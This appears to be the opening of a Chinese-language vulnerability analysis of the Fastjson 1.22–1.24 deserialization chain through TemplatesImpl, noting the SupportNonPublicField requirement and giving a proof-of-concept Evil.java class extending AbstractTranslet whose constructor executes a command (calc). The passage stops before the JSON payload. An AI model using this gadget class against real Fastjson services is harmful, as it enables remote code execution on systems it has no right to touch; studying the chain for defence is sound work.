# Fastjson1.22-1.24反序列化分析之TemplateImpl

## 限制

这个利用链要求还是很高的，需要设置`Feature.SupportNonPublicField`才能成功触发

## 利用过程

首先写一个`Evil.java`，需要继承`AbstractTranslet`后面会简单说到

```java
public class Evil extends AbstractTranslet {
    public Evil() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    public static void main(String[] args) throws Exception {
        Evil t = new Evil();
    }
}
```

